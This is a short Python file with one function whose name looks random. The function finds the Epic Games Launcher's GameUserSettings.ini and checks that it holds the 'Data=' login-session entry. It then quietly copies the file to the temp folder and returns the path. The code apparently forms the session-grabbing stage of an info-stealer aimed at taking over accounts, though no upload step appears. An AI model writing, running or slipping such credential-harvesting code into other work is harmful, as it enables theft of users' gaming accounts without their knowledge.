import os
import shutil
import tempfile

def wpiccg4m3s():
    local_p = os.getenv('LOCALAPPDATA')
    epic_p = rf"{local_p}\EpicGamesLauncher\Saved\Config\Windows"
    
    if os.path.exists(epic_p) and os.path.isdir(epic_p):
        file_p = os.path.join(epic_p, "GameUserSettings.ini")
        
        if os.path.exists(file_p):
            with open(file_p, "r", encoding="utf-8") as f:
                conteudo = f.read()
                if "Data=" not in conteudo:
                    return False, "blank config file."
            
            temp_p = os.path.join(tempfile.gettempdir(), "GameUserSettings.ini")
            
            shutil.copy(file_p, temp_p)
            return True, temp_p
        else:
            return False, "config file not found."
    else:
        return False, "non-existent path."